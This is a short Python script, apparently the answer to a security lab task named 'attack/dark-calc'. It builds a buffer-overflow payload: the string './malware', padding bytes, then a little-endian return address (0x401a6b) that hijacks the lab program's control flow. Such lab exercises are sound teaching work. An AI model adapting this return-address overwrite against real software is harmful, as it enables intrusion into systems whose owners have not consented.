#!/usr/bin/env python3
"""Task 1: build the payload for attack/dark-calc.

TODO: replace the empty payload with the bytes required by the lab.
"""
import sys

TARGET = 0x401a6b
payload = b'./malware\x00'
payload += b"A" * (24 - len(payload))

payload += TARGET.to_bytes(8,"little")


sys.stdout.buffer.write(payload)
